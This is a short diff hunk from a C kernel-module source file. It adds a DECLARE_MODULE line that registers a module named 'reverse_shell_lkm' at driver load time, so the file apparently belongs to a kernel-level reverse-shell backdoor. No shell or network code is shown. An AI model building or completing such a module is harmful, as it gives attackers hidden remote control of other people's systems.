@@ -448,3 +448,5 @@ static moduledata_t module_data = {
     event_handler,
     NULL
 };
+
+DECLARE_MODULE(reverse_shell_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
